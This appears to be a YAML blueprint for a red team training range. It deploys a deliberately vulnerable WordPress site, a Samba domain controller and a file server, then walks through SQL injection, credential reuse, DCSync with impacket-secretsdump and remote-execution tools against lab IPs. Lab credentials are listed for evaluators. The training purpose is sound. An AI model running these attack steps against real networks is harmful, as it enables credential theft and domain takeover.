# Red Team Training Lab Blueprint for CYROID
# Import this blueprint via CYROID's Range Import feature

seed_id: red-team-training-lab
name: Red Team Training Lab
description: |
  Comprehensive red team training environment featuring:
  - Kali Attack Box with pre-installed tools (Metasploit, Impacket, CrackMapExec, etc.)
  - WordPress target with SQL injection vulnerabilities
  - Samba Domain Controller (AD-compatible)
  - Internal file server with sensitive data
  - Victim workstation for BeEF exploitation

  Attack paths: SQLi → Credential theft → Lateral movement → Domain compromise

  NOTE: DCSync with Impacket has limited support on Samba 4. Alternative path uses
  credentials found in passwords.txt on the file server.

category: red-team
difficulty: intermediate
duration_minutes: 120

# Blueprint configuration
base_subnet_prefix: "172.16"

networks:
  - name: internet
    subnet: "172.16.0.0/24"
    gateway: "172.16.0.1"
    is_isolated: false

  - name: dmz
    subnet: "172.16.1.0/24"
    gateway: "172.16.1.1"
    is_isolated: true

  - name: internal
    subnet: "172.16.2.0/24"
    gateway: "172.16.2.1"
    is_isolated: true

vms:
  # Attack box - connected to all networks for attack chain
  - hostname: kali
    docker_image_tag: "redteam-lab-kali:latest"
    networks:
      - network_name: internet
        ip_address: "172.16.0.10"
      - network_name: dmz
        ip_address: "172.16.1.100"
      - network_name: internal
        ip_address: "172.16.2.100"
    cpu: 2
    ram_mb: 4096
    disk_gb: 40
    position_x: 100
    position_y: 200

  # DMZ - WordPress (dual-homed: public + DMZ)
  - hostname: wordpress
    docker_image_tag: "redteam-lab-wordpress:latest"
    networks:
      - network_name: internet
        ip_address: "172.16.0.100"
      - network_name: dmz
        ip_address: "172.16.1.10"
    cpu: 1
    ram_mb: 2048
    disk_gb: 20
    position_x: 400
    position_y: 200

  # Internal network - Samba Domain Controller
  - hostname: dc01
    docker_image_tag: "redteam-lab-samba-dc:latest"
    networks:
      - network_name: internal
        ip_address: "172.16.2.12"
    cpu: 2
    ram_mb: 4096
    disk_gb: 40
    position_x: 700
    position_y: 100

  # Internal network - File Server with sensitive data
  - hostname: fileserver
    docker_image_tag: "redteam-lab-fileserver:latest"
    networks:
      - network_name: internal
        ip_address: "172.16.2.10"
    cpu: 1
    ram_mb: 1024
    disk_gb: 20
    position_x: 700
    position_y: 200

  # Internal network - Victim Workstation
  - hostname: ws01
    docker_image_tag: "redteam-lab-workstation:latest"
    networks:
      - network_name: internal
        ip_address: "172.16.2.11"
    cpu: 1
    ram_mb: 2048
    disk_gb: 20
    position_x: 700
    position_y: 300

router:
  enabled: true
  dhcp_enabled: false

# Training scenario events (MSEL)
events:
  - sequence: 1
    delay_minutes: 0
    title: "Phase 1: Reconnaissance"
    description: |
      Use Kali tools to scan and enumerate the target networks.

      Commands:
        nmap -sn 172.16.0.0/24   # Discover internet-facing hosts
        nmap -sV 172.16.0.100    # Scan WordPress server

  - sequence: 2
    delay_minutes: 15
    title: "Phase 2: Initial Access - Web Application Attack"
    description: |
      Exploit SQL injection in the WordPress Employee Directory plugin.

      Access: http://172.16.0.100/?page_id=4
      Search for: IT

      The plugin has SQLi in the search parameter. Extract VPN credentials
      from the wp_acme_employees table:
        - jsmith / Summer2024
        - mwilliams / Welcome123
        - svc_backup / Backup2024!

  - sequence: 3
    delay_minutes: 30
    title: "Phase 3: Lateral Movement - File Server Access"
    description: |
      Use extracted credentials to access the internal file server with Impacket.

      Using impacket-smbclient (interactive):
        impacket-smbclient 'svc_backup:Backup2024!@172.16.2.10'
        # use sensitive
        # ls
        # cat passwords.txt

      Alternative with traditional smbclient:
        smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024!' -c 'ls'

      The passwords.txt file contains the Domain Administrator password.

  - sequence: 4
    delay_minutes: 45
    title: "Phase 4: Domain Compromise"
    description: |
      Use discovered credentials to compromise the domain with Impacket tools.

      Credentials from passwords.txt: Administrator / Adm1n2024!

      Attempt DCSync with Impacket (svc_backup has replication rights):
        impacket-secretsdump 'acmewidgets.local/svc_backup:Backup2024!@172.16.2.12'

      Note: Samba 4 has limited DCSync support. If secretsdump fails, use the
      Domain Admin credentials from passwords.txt directly.

      Validate Domain Admin access:
        impacket-smbclient 'Administrator:Adm1n2024!@172.16.2.12'

  - sequence: 5
    delay_minutes: 60
    title: "Phase 5: Post-Exploitation"
    description: |
      With Domain Admin credentials, demonstrate access to all internal systems
      using Impacket tools:

      File Server (172.16.2.10):
        impacket-smbclient 'Administrator:Adm1n2024!@172.16.2.10'

      Domain Controller (172.16.2.12):
        impacket-smbclient 'Administrator:Adm1n2024!@172.16.2.12'
        impacket-secretsdump 'Administrator:Adm1n2024!@172.16.2.12'

      Additional Impacket tools to explore:
        impacket-psexec    - Remote command execution via SMB
        impacket-wmiexec   - Remote command execution via WMI
        impacket-atexec    - Remote command execution via Task Scheduler
        impacket-reg       - Remote registry manipulation

      Document your attack chain for the after-action review.

# Credentials Reference (for evaluators)
credentials:
  wordpress_admin:
    username: admin
    password: "Acme2024!"
  wordpress_users:
    - username: jsmith
      password: "Summer2024"
    - username: mwilliams
      password: "Welcome123"
  service_accounts:
    - username: svc_backup
      password: "Backup2024!"
      notes: "DCSync rights on domain"
  domain_admin:
    username: Administrator
    password: "Adm1n2024!"
    notes: "Found in passwords.txt on fileserver"
